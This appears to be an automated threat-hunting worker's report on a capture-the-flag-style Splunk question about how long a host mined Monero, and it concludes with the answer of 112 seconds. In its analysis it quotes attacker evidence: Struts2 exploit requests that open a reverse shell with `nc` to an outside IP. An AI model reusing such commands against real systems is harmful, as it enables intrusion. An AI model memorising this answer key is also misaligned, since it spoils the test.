# s2 - Q216 - Round 1
_stamped by runner: rounds_remaining=7 novel_spl=5_
**Scope:** sourcetype=stream:tcp, stream:http, stream:dns (source=stream:tcp / stream:Splunk_Tcp / stream:Splunk_SSLActivity) | fields=src_ip, dest_ip, dest_port, time_taken, bytes_in/out, data_packets_in/out, timestamp, endtime, flow_id
**Insight:** FOUND   **Candidate:** 112   **Confidence:** 90

## Prior rounds
- (Round 1, this worker) No prior rounds for this worker; s1 (NVM scope) narrowed the NVM candidate to a single 112-second 3333 flow but left the Monero attribution unverified externally.

## This round
### What I ran
- get_source_types / get_sourcetype_fields stream:tcp -> confirmed packet-level feed with src_ip/dest_ip/dest_port/time_taken/bytes fields; dest_ip=45.77.53.176 present (4,958 events).
- `sourcetype=stream:tcp src_ip=192.168.70.186 dest_ip=45.77.53.176 | stats ...` -> 3,885 flows, ports 3333+443, span 1534759305.8–1534766375.2.
- Same query `by dest_port` -> port 3333: exactly 1 flow, time_taken 111,786,232 µs, 5.76MB out / 39KB in; port 443: 3,884 flows, 3.2MB total.
- get_raw_events keyword "45.77.53.176:3333" -> the single flow event: 192.168.70.186:64104 -> 45.77.53.176:3333, timestamp 10:47:05.536706Z, endtime 10:48:57.322257Z, time_taken=111786232, 3993 data packets out vs 1 in, app=http, uri /images/logos.png.
- get_raw_events stream:http "45.77.53.176" -> same 3333 session (status 200, 5.5MB out) plus Struts2 OGNL exploit POSTs to 192.168.9.30:8080 reverse-shelling to `nc 45.77.53.176 8088`.
- stream:dns for the IP and for the host's queries in the window -> only unanswered PTR lookups; no pool hostname.

### What it means
FOUND: independent of Cisco NVM, packet-level stream:tcp shows exactly one 3333 flow from 192.168.70.186 to 45.77.53.176, spanning epoch 1534762025.54–1534762137.32 — precisely SH's window — with time_taken 111.786 s (endtime−timestamp cross-check = 111.786 s, confirming µs units). Its behaviour is mining-consistent: 3,993 data packets out vs 1 in, 5.76MB uploaded vs 39KB received on the canonical Stratum/XMRig pool port, and 45.77.53.176 is confirmed attacker infrastructure (Struts2 reverse shell to 45.77.53.176:8088). Duration = 111.786 s → **112 seconds**, matching s1's NVM candidate.

## Assumptions
- Coverage: stream:tcp (queried — found the flow), stream:http (queried — corroborates session + attacker infra), stream:dns (queried — no pool hostname, raw-IP connection) — VERIFIED. cisco:asa, aws:cloudwatchlogs:vpcflow, stream:udp not queried — UNVERIFIED (not needed; packet-level TCP feed is authoritative for a TCP 3333 session).
- Selection: the single 3333 flow is the only 3333 flow for this host; the 3,884 port-443 flows to the same IP were examined and ruled out (failed SSL handshakes, ~824B avg, refused=1, TLS_NULL cipher — C2-like, not share submission) — VERIFIED by the by-port stats and raw 443 events.
- Premise: stream:tcp time_taken is microseconds — VERIFIED (endtime−timestamp = 111.7856 s matches time_taken/1e6 = 111.786 s).
- Premise: 45.77.53.176:3333 is Monero/pool-related — VERIFIED behaviourally (sustained 5.76MB outbound upload, 3993:1 data-packet ratio, port 3333, disguised as HTTP /images/logos.png) and by attacker-infra linkage; no explicit "monero" string exists in these feeds (DNS shows no pool name) — the attribution rests on the traffic signature, which is the strongest available non-NVM evidence.

## Ruled out
- Port 443 flows to 45.77.53.176 (3,884 flows, 1534759305–1534766375) — small failed/refused SSL handshakes, C2/beacon pattern, not mining; excluded from duration.
- DNS-based pool identification — only unanswered PTR queries; miner uses raw IP.
- Other hosts' traffic to 45.77.53.176 (e.g. 192.168.8.103 exploit source, 192.168.9.30 victim) — different act (Struts2 exploitation), not mining by 192.168.70.186.

## Open questions for SH
- Should the 3,884 port-443 flows to 45.77.53.176 be treated as part of "generating Monero"? Evidence says no (failed SSL handshakes, no share-submission profile); confirm the question intends only the 3333 Stratum session.
- Is corroboration from cisco:asa or aws:cloudwatchlogs:vpcflow wanted, or is packet-level stream:tcp sufficient to close the external-verification premise?

_Iteration cap reached: 10/10 iterations used this round — cut off, not finished._

_Partial results (runner): 1 result(s) this round returned only their first rows — `get_sourcetype_fields: {"sourcetype": "stream:tcp"}` (46 of 92 rows seen). A claim resting on them alone is UNVERIFIED._
